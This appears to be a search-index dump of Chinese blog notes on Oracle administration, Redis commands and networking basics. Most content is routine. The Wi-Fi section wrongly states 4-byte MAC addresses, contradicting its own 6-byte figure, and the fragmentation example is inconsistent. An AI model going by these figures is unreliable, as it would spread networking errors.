","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:5","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#sql-优化"},{"categories":["blog"],"content":" sql 优化 查看执行计划 select /*+ gather_plan_statistics */ * from table(dbms_xplan.display_cursor(NVL('ajkqn4733r2qx',NULL),NULL,'ALL ALLSTATS LAST PEEKED_BINDS cost partition -projection -outline')); 查看 session 执行的 sql SELECT c.spid, b.sql_text, a.sid, a.serial#, osuser, machine FROM v$session a, v$sqlarea b ,v$process c WHERE a.sql_address = b.address and a.paddr=c.addr and spid=\u0026pid; sql-tuning创建并执行 tuning 任务 DECLARE my_task_name VARCHAR2(300); my_sqltext CLOB; BEGIN my_sqltext := 'select a.join_year,a.\"FAMILY_INFO_ID\",a.\"FAMILY_NO\",a.\"CARD_NO\",a.\"FAMILY_NO\" as BOOK_NO ,a.\"CENTER_NO\",a.\"AREA_NO\",a.\"COUNTRY_NO\", substr(a.\"FAMILY_NO\",-4,4) as DOOR_NO,a.\"MASTER_NO\",a.\"ADDRESS\",a.\"POSTALCODE\",a.\"PHONECODE\",a.\"LINKMAN\",a.\"EMAIL\",a.\"POPULATION\", a.\"FARMER\",a.\"FARMER_STAY\",a.\"JOIN_PROP\",a.\"DOOR_PROP\",a.\"RPR_TYPE\",a.\"INOUT_FLAG\",a.\"INOUT_DATE\",a.\"INOUT_REASON\",a.\"SALVATION\", a.\"REGISTER\",a.\"REGISTER_DATE\",a.\"BOOK_STATE\",a.\"CARD_STATE\",a.\"FAMILY_STATE\",a.\"AUDI_MAN\",a.\"AUDI_STATE\",a.\"AUDI_TIME\",a.\"UPDATE_TIME\", a.\"UPDATE_MAN\",a.\"CREATE_TIME\",a.\"CREATE_MAN\",a.\"COMMENTS\",a.\"IS_DEL\",a.\"FRONT_STATE_D301\",a.\"STR1\",a.\"STR2\",a.\"STR3\",a.\"STR4\",a.\"STR5\", a.\"ZHEN_NO\",a.\"CUN_NO\",a.\"MASTER_NAME\" from T_NH_CANHE_FAMILYS a where a.is_del=1 and exists (select 1 from t_nh_dict_area x where a.country_no=x.countrycode and x.state=1)'; my_task_name := DBMS_SQLTUNE.CREATE_TUNING_TASK( sql_text =\u003e my_sqltext, user_name =\u003e 'XIANGXI', -- 必须大写 scope =\u003e 'COMPREHENSIVE', time_limit =\u003e 20, task_name =\u003e 'tuning_sql_test', description =\u003e 'Task to tune a query on a specified table'); DBMS_SQLTUNE.EXECUTE_TUNING_TASK( task_name =\u003e 'tuning_sql_test'); END; 查看具体内容: select dbms_sqltune.report_tuning_task('tuning_sql_test') from dual; 使用完毕后删除: //sys用户删除 delete from dba_advisor_tasks where task_name ='tuning_sql_test' ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:5","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#查看执行计划"},{"categories":["blog"],"content":" sql 优化 查看执行计划 select /*+ gather_plan_statistics */ * from table(dbms_xplan.display_cursor(NVL('ajkqn4733r2qx',NULL),NULL,'ALL ALLSTATS LAST PEEKED_BINDS cost partition -projection -outline')); 查看 session 执行的 sql SELECT c.spid, b.sql_text, a.sid, a.serial#, osuser, machine FROM v$session a, v$sqlarea b ,v$process c WHERE a.sql_address = b.address and a.paddr=c.addr and spid=\u0026pid; sql-tuning创建并执行 tuning 任务 DECLARE my_task_name VARCHAR2(300); my_sqltext CLOB; BEGIN my_sqltext := 'select a.join_year,a.\"FAMILY_INFO_ID\",a.\"FAMILY_NO\",a.\"CARD_NO\",a.\"FAMILY_NO\" as BOOK_NO ,a.\"CENTER_NO\",a.\"AREA_NO\",a.\"COUNTRY_NO\", substr(a.\"FAMILY_NO\",-4,4) as DOOR_NO,a.\"MASTER_NO\",a.\"ADDRESS\",a.\"POSTALCODE\",a.\"PHONECODE\",a.\"LINKMAN\",a.\"EMAIL\",a.\"POPULATION\", a.\"FARMER\",a.\"FARMER_STAY\",a.\"JOIN_PROP\",a.\"DOOR_PROP\",a.\"RPR_TYPE\",a.\"INOUT_FLAG\",a.\"INOUT_DATE\",a.\"INOUT_REASON\",a.\"SALVATION\", a.\"REGISTER\",a.\"REGISTER_DATE\",a.\"BOOK_STATE\",a.\"CARD_STATE\",a.\"FAMILY_STATE\",a.\"AUDI_MAN\",a.\"AUDI_STATE\",a.\"AUDI_TIME\",a.\"UPDATE_TIME\", a.\"UPDATE_MAN\",a.\"CREATE_TIME\",a.\"CREATE_MAN\",a.\"COMMENTS\",a.\"IS_DEL\",a.\"FRONT_STATE_D301\",a.\"STR1\",a.\"STR2\",a.\"STR3\",a.\"STR4\",a.\"STR5\", a.\"ZHEN_NO\",a.\"CUN_NO\",a.\"MASTER_NAME\" from T_NH_CANHE_FAMILYS a where a.is_del=1 and exists (select 1 from t_nh_dict_area x where a.country_no=x.countrycode and x.state=1)'; my_task_name := DBMS_SQLTUNE.CREATE_TUNING_TASK( sql_text =\u003e my_sqltext, user_name =\u003e 'XIANGXI', -- 必须大写 scope =\u003e 'COMPREHENSIVE', time_limit =\u003e 20, task_name =\u003e 'tuning_sql_test', description =\u003e 'Task to tune a query on a specified table'); DBMS_SQLTUNE.EXECUTE_TUNING_TASK( task_name =\u003e 'tuning_sql_test'); END; 查看具体内容: select dbms_sqltune.report_tuning_task('tuning_sql_test') from dual; 使用完毕后删除: //sys用户删除 delete from dba_advisor_tasks where task_name ='tuning_sql_test' ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:5","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#查看-session-执行的-sql"},{"categories":["blog"],"content":" sql 优化 查看执行计划 select /*+ gather_plan_statistics */ * from table(dbms_xplan.display_cursor(NVL('ajkqn4733r2qx',NULL),NULL,'ALL ALLSTATS LAST PEEKED_BINDS cost partition -projection -outline')); 查看 session 执行的 sql SELECT c.spid, b.sql_text, a.sid, a.serial#, osuser, machine FROM v$session a, v$sqlarea b ,v$process c WHERE a.sql_address = b.address and a.paddr=c.addr and spid=\u0026pid; sql-tuning创建并执行 tuning 任务 DECLARE my_task_name VARCHAR2(300); my_sqltext CLOB; BEGIN my_sqltext := 'select a.join_year,a.\"FAMILY_INFO_ID\",a.\"FAMILY_NO\",a.\"CARD_NO\",a.\"FAMILY_NO\" as BOOK_NO ,a.\"CENTER_NO\",a.\"AREA_NO\",a.\"COUNTRY_NO\", substr(a.\"FAMILY_NO\",-4,4) as DOOR_NO,a.\"MASTER_NO\",a.\"ADDRESS\",a.\"POSTALCODE\",a.\"PHONECODE\",a.\"LINKMAN\",a.\"EMAIL\",a.\"POPULATION\", a.\"FARMER\",a.\"FARMER_STAY\",a.\"JOIN_PROP\",a.\"DOOR_PROP\",a.\"RPR_TYPE\",a.\"INOUT_FLAG\",a.\"INOUT_DATE\",a.\"INOUT_REASON\",a.\"SALVATION\", a.\"REGISTER\",a.\"REGISTER_DATE\",a.\"BOOK_STATE\",a.\"CARD_STATE\",a.\"FAMILY_STATE\",a.\"AUDI_MAN\",a.\"AUDI_STATE\",a.\"AUDI_TIME\",a.\"UPDATE_TIME\", a.\"UPDATE_MAN\",a.\"CREATE_TIME\",a.\"CREATE_MAN\",a.\"COMMENTS\",a.\"IS_DEL\",a.\"FRONT_STATE_D301\",a.\"STR1\",a.\"STR2\",a.\"STR3\",a.\"STR4\",a.\"STR5\", a.\"ZHEN_NO\",a.\"CUN_NO\",a.\"MASTER_NAME\" from T_NH_CANHE_FAMILYS a where a.is_del=1 and exists (select 1 from t_nh_dict_area x where a.country_no=x.countrycode and x.state=1)'; my_task_name := DBMS_SQLTUNE.CREATE_TUNING_TASK( sql_text =\u003e my_sqltext, user_name =\u003e 'XIANGXI', -- 必须大写 scope =\u003e 'COMPREHENSIVE', time_limit =\u003e 20, task_name =\u003e 'tuning_sql_test', description =\u003e 'Task to tune a query on a specified table'); DBMS_SQLTUNE.EXECUTE_TUNING_TASK( task_name =\u003e 'tuning_sql_test'); END; 查看具体内容: select dbms_sqltune.report_tuning_task('tuning_sql_test') from dual; 使用完毕后删除: //sys用户删除 delete from dba_advisor_tasks where task_name ='tuning_sql_test' ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:2:5","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#sql-tuning"},{"categories":["blog"],"content":" 维护操作","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:0","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#维护操作"},{"categories":["blog"],"content":" 新建表空间, 用户, 授权等 # 新建表空间 create tablespace xo datafile 'f:/xo.dbf' size 50m autoextend on; # 新建临时表空间 create temporary tablespace tempfile 'f:/xo.dbf' size 50m autoextend on; # 表空间添加文件 alter tablespace sales add datafile '/home/app/oracle/oradata/oracle8i/sales02.dbf' size 800M autoextend on next 50M maxsize 1000M; # 数据库文件大小重置 alter database datafile ‘dir’ resize 1000m; # 新建用户 create user test identified by test default tablespace xo temporary tablespace test_temp; # 修改用户密码 alter user test identified by 123456; # 删除用户 drop user test cascade; # 授权角色 grant dba,connect,resource to test; # 授权表操作 grant select on v$session to test; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:1","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#新建表空间-用户-授权等"},{"categories":["blog"],"content":" 收集统计信息 execute dbms_stats.gather_table_stats(ownname =\u003e 'owner',tabname =\u003e 'table_name' ,estimate_percent =\u003e null ,method_opt =\u003e 'for all indexed columns' ,cascade =\u003e true) ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:2","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#收集统计信息"},{"categories":["blog"],"content":" 客户端字符集 NLS_LANG=\"AMERICAN_AMERICA.ZHS16GBK\" ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:3","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#客户端字符集"},{"categories":["blog"],"content":" 用户表大小排名 select OWNER, t.segment_name, t.segment_type, sum(t.bytes / 1024 / 1024) mmm from dba_segments t where t.owner = 'XIANGXI' and t.segment_type='TABLE' group by OWNER, t.segment_name, t.segment_type order by mmm desc; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:4","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#用户表大小排名"},{"categories":["blog"],"content":" 触发器 trigger alter trigger xx_trigger disable; alter trigger xx_trigger enable; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:5","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#触发器-trigger"},{"categories":["blog"],"content":" 索引 index # 快速创建索引 create index idx_table_a on table_a(字段a,字段b) nologging parallel 4; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:6","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#索引-index"},{"categories":["blog"],"content":" 重建所有索引 declare STR VARCHAR2(400); begin -- 重建Oracle索引 FOR TMP_IDX IN (SELECT TABLESPACE_NAME, OWNER, TABLE_NAME, INDEX_NAME FROM ALL_INDEXES WHERE OWNER = 'HNACMS' AND temporary = 'N' --AND TABLE_NAME = 'K_TASK' --AND TABLESPACE_NAME \u003c\u003e 'HNACMS_INDX' ORDER BY TABLESPACE_NAME, TABLE_NAME) LOOP STR := 'ALTER INDEX ' || TMP_IDX.OWNER || '.' || TMP_IDX.INDEX_NAME || ' Rebuild Tablespace HNACMS_INDX'; EXECUTE IMMEDIATE STR; END LOOP; end; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:7","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#重建所有索引"},{"categories":["blog"],"content":" 闪回 flashback # 启用闪回 startup mount; alter database archivelog; alter database flashback on; alter database open; # 开启行移动后,才能执行闪回 alter table xx enable movement; # 闪回表到5分钟前 flashback table xx as of timestamp sysdate-5/1440; flashback table t_canhe_family to timestamp (systimestamp-interval '5' minute); # 查询5分钟前 select * from table as of timestamp sysdate-5/1440; # 还原表 flashback table xx to before drop； ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:8","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#闪回-flashback"},{"categories":["blog"],"content":" 缩小表 shrink alter table my_objects enable row movement; alter table my_objects shrink space; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:9","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#缩小表-shrink"},{"categories":["blog"],"content":" 日志切换时间 select b.SEQUENCE#, b.FIRST_TIME,a.SEQUENCE#, a.FIRST_TIME,round(((a.FIRST_TIME-b.FIRST_TIME)*24)*60,2) from v$log_history a, v$log_history b where a.SEQUENCE#=b.SEQUENCE#+1 and b.THREAD#=1 order by a.SEQUENCE# desc; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:3:10","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#日志切换时间"},{"categories":["blog"],"content":" 排错","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:0","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#排错"},{"categories":["blog"],"content":" 活动的 session select s.SID, s.SERIAL#, 'kill -9 ' || p.SPID, s.MACHINE, s.OSUSER, s.PROGRAM, s.USERNAME, s.last_call_et, a.SQL_ID, s.LOGON_TIME, a.SQL_TEXT, a.SQL_FULLTEXT, w.EVENT, a.DISK_READS, a.BUFFER_GETS from v$process p, v$session s, v$sqlarea a, v$session_wait w where p.ADDR = s.PADDR and s.SQL_ID = a.sql_id and s.sid = w.SID and s.STATUS = 'ACTIVE' order by s.last_call_et desc; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:1","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#活动的-session"},{"categories":["blog"],"content":" 锁表查询 SELECT l.session_id sid, s.serial#, l.locked_mode,l.oracle_username, l.os_user_name,s.machine, s.terminal, o.object_name, s.logon_time FROM v$locked_object l, all_objects o, v$session s WHERE l.object_id = o.object_id AND l.session_id = s.sid ORDER BY sid, s.serial# ; ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:2","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#锁表查询"},{"categories":["blog"],"content":" 生成 AWRSQL 路径在 oracle_home/rdbms/admin/awrrpt.sql,可以参考 手工生成AWR报告方法记录_ITPUB博客 sqlplus sys/oracle as sysdba /nolog @oracle_home/rdbms/admin/awrrpt.sql # 按照提示输入即可 # 其中文件名，可以填好路径。方便后面使用 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:4:3","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#生成-awr"},{"categories":["blog"],"content":" 常用图表 数据文件: dba_data_file 临时表空间: dba_temp_file 数据库使用的 directory 路径: dba_directories 会话: v$ssesion. 其中 sid,serial# 用于杀死会话. paddr 用于关联 v$proccess的addr,关闭系统进程. 进程: v$proccess. 其中 spid 用 kill -9 杀死进程. addr 管理 v$ssesion SQL 文本: v$sqlarea. sql_id,hash_value 用于锁定 sql. sql_fulltext 全部 sql 语句，不会因为太长而截断 查看所有的 dblink: dba_db_links 空闲表空间: dba_free_space 分区表视图: ALL_PART_TABLES 通过 table_name，找到分区表的概况信息. dba_tab_subpartitions 分区表的详细信息 其中有分区名、子分区名 分区表查询 select * from table partition (分区名) Select * from table subpartition (子分区名) 约束视图: dba_constraints ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/:5:0","series":null,"tags":["blog","oracle"],"title":"oracle-使用技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/#常用图表"},{"categories":["point"],"content":"redis 通常用来做缓存数据库. 要点: 免费 性能高 缓存常用 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/redis/:0:0","series":null,"tags":["point","redis"],"title":"redis","uri":"/posts/%E7%AC%94%E8%AE%B0/point/redis/#"},{"categories":["point"],"content":" 运行 docker run --name ken-redis -d -p6379:6379 --restart=always -v /data/redis-data:/data redis --requirepass \"didi\" ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/redis/:0:1","series":null,"tags":["point","redis"],"title":"redis","uri":"/posts/%E7%AC%94%E8%AE%B0/point/redis/#运行"},{"categories":["point"],"content":" 操作手册 # 删除 ip地址的8号库的a_* redis-cli -h ip地址 -a 密码 -n 8 keys 'a_*' | xargs redis-cli -h ip地址 -a 密码 -n 8 del # 把0库所有内容移动到1库 redis-cli -a 密码 -n 0 keys '*' | xargs -I '{}' redis-cli -a didi -n 0 move '{}' 1 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/redis/:0:2","series":null,"tags":["point","redis"],"title":"redis","uri":"/posts/%E7%AC%94%E8%AE%B0/point/redis/#操作手册"},{"categories":["blog"],"content":"这里记录一些 ip, 包, 传输协议, 段, 和7 层网络知识等等网络知识, 方便快速查阅. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/"},{"categories":["blog"],"content":" 简介这里记录一些 ip, 包, 传输协议, 段, 和 7 层网络知识等等网络知识, 方便快速查阅. 参考资料 计算机网络 - Computer Network ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:1:0","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:0","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#内容"},{"categories":["blog"],"content":" 7 层通信 路由器和 3层交换机 等价. 2层交换机 活动在数据链路层, 只是延长网络. 每一层都加上自己的 header头部数据. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:1","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#7-层通信"},{"categories":["blog"],"content":" 7 层模型各自的作用 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:2","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#7-层模型各自的作用"},{"categories":["blog"],"content":" 7 层网络协议 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/:2:3","series":null,"tags":["blog","网络知识"],"title":"网络知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86/#7-层网络协议"},{"categories":["blog"],"content":" 数据包详解 数据包示意图 数据链路层 帧 frame帧首部和尾部的大小并不一定. 以太网IEEE 802.3-以太网 帧的首部通常是 14 个字节（6 个字节的目标 MAC 地址，6 个字节的源 MAC 地址和 2 个字节的类型/长度字段）。帧尾部是 4 个字节的校验和字段。Ethernet frame - Wikipedia 因此，整个以太网帧的首部和尾部共占据 18 个字节的空间。VLAN 等衍生技术可能会增加额外字节 WIFIIEEE 802.11 的帧结构在设计上考虑了无线信道特性、多跳传输、移动性以及安全性等因素，以适应无线局域网环境中的需求。IEEE 802.11 - Wikipedia 最小是 32 字节,最小的组成为: 帧头部（Frame Header）：帧头部的长度为 28 个字节，包含以下字段： Frame Control：2 个字节，用于指示帧类型、子类型和其他控制信息。 Duration/ID：2 个字节，用于指示帧的持续时间或标识符。 Address 1-4：每个地址字段占 6 个字节，用于指示目标 MAC 地址、源 MAC 地址和其他相关地址。 Sequence Control：0 或 2 个字节，用于指示帧的序列号和片段编号。 Qos: 0 或 2 字节,流控 HT Controler: 0 或 4 字节,高吞吐量 帧尾部（Frame Footer）：帧尾部的长度为 4 个字节，包含 FCS（Frame Check Sequence）字段，用于进行帧的差错检测。 不同的原因: 帧类型字段： Wi-Fi 帧中包含一个帧类型字段，用于指示该帧的类型。帧类型字段可以表示数据帧、控制帧或管理帧。这有助于 Wi-Fi 设备在接收到帧时正确处理和解释其目的和功能。 MAC 地址格式： 以太网使用 6 字节的 MAC 地址来唯一标识网络设备，而 Wi-Fi 引入了扩展的 MAC 地址格式。Wi-Fi 的帧首部包含 4 字节的接收者 MAC 地址和 4 字节的发送者 MAC 地址。这样的设计支持更复杂的无线网络拓扑，例如多跳传输和移动设备的漫游。 序列控制字段： Wi-Fi 帧中包含一个序列控制字段，用于维护帧的传输顺序和可靠性。序列控制字段包括分片编号、片段计数和帧序列号等信息，以确保帧在无线信道上传输和组装时的正确顺序。 帧校验序列（FCS）： 以太网帧使用循环冗余校验（CRC）字段来检测帧的传输错误，而 Wi-Fi 帧使用一个更复杂的 FCS 字段来实现错误检测。FCS 字段包含了更强大的校验算法，以提高对无线信道上的干扰和误码的容错能力。 MTUMTU 如果设置太大, 可能被路由器拒绝转发. 太小又会导致效率低. windows 查看 MTU netsh.exe interface ipv4 show subinterfaces linux 查看 MTU ip a 网络层 TCP-IP 协议栈 IP 数据报格式 版本：占 4 位，指 IP 协议的版本。（IPv4/IPv6） 首部长度：占 4 位，单位是 4B，最小为 5（因为首部固定部分 20B，5 * 4B = 20B），最大为 15（15 * 4B = 60B） 区分服务：占 8 位，用来获取更好的服务（如：优先级），但实际上一直没有用过 总长度：占 16 位，首部 + 数据部分的总长度，单位是 1B，因此数据报的总长度为 标识/标志/片偏移是分片专用. IP 数据报分片 生存时间（TTL）：占 8 位，IP 分组的保质期，经过一个路由器就 -1，变为 0 则丢弃 协议：占 8 位，数据部分的协议，即传输层使用的是什么协议 首部检验和：占 16 位，只检验数据报的首部，但不包含数据部分。每经过一个路由器，都会重新计算一下首部检验和。 源地址：占 32 位 目的地址：占 32 位 可选字段：占 0 ~ 40 位，用来支持排错、测量以及安全措施 填充：全 0，把首部长度补成 4B 的整数倍 协议名 ICMP IGMP TCP EGP IGP UDP IPv6 ESP OSPF 字段值 1 2 6 8 9 17 41 50 89 IP 数据报分片由于 MTU 最大 1500 的限制, 如果发送大于 1500-20 (ip 头部最小为 20 byte)=1480 的数据, 就需要分片.不会考虑 TCP 头, 也就是说 TCP 头只会在第一个分片中存在. 标识：占 16 位，同一数据报的分片使用同一标识 标志：占 3 位，只有两位有意义 x _ _ 中间位 DF（Don’t Fragment） DF = 1，禁止分片 DF = 0，允许分片 最低位 MF（More Fragment） MF = 1，后面还有分片 MF = 0，代表最后一片 / 没分片 片偏移：指出较长分组分片后，某片在原分组中的相对位置。（以 8B 为单位） 除了最后一片，每个分片长度一定是 8B 的整数倍 假设我要发送 3800 byte 的数据,tcp 头 24 byte,组成的数据包 3824 byte. 最大数据量为 1500-24 = 1476 byte. 要被 8 整除. 所以最大数据量为 1472/8=184 . 3800 / 1472 = 2.58…. = 3 次. 数据 总长度 标识 MF DF 片偏移 原始数据包 3800+24=3824 12345 0 0 0 数据包 1 1472+24=1496 12345 1 0 0 数据包 2 1472+24=1496 12345 1 0 184 数据包 3 856+24=880 12345 0 0 368 私有 IP 地址 CIDR 标识 地址范围 IP 个数 10.0.0.0/8 10.0.0.0~10.255.255.255 16,777,216 172.16.0.0/12 172.16.0.0~172.31.255.255 1,048,576 192.168.0.0/16 192.168.0.0~192.168.255.255 65,536 ARP/RARP 协议 ARP: 通过 ip 获取物理 mac 地址. 发送 arp 广播, 目标机器响应结果. 此协议互信, 所以可以伪造 ARP 响应包, 目标一旦缓存了错误的数据, 目标就会将数据发送给伪造者. RARP: 通过 mac 地址获取 ip 地址. 广播 mac 地址, RARP 服务器检查后, 返回 IP 地址, 不存在则不响应. DHCP 协议DHCP 协议过程： 主机广播 DHCP 发现报文 “有没有 DHCP 服务器呀” 试图找到网络中的服务器，向服务器获得一个 IP 地址 DHCP 服务器广播 DHCP 提供报文 “有！有！有！” 服务器拟分配给主机一个 IP 地址及相关配置，先到先得 主机广播 DHCP 请求报文 “我用你给我的 IP 地址啦？” 主机向服务器请求提供 IP 地址 DHCP 服务器广播 DHCP 确认报文 “用吧！” 正式将 IP 地址分配给主机 ICMP 协议 Ping 测试连通性. 发送数据包, 通常远端会返回响应. 但防火墙之类的也可以不响应. Tracertoute 跟踪数据包流转的路径. 每次经过节点都会 ttl-1 .同时如果为 0, 当前节点就会返回响应. 所以可以不断尝试, 拿到路由路径. 传输层 UDP UDP 是无连接的，减少开销和发送数据之间的时延 UDP 使用最大努力交付，即不保证可靠交付 UDP 是面向报文的，适合一次性传输少量数据的网络应用. 对于应用层交付的报文，直接原封不动的封装到 UDP 数据报的数据部分，即一次发一个完整的报文 UDP 无拥塞控制，适合很多实时应用. 例如直播 UDP 首部开销很小，8 byte，TCP 需要 20 byte UDP 的头部格式 TCP 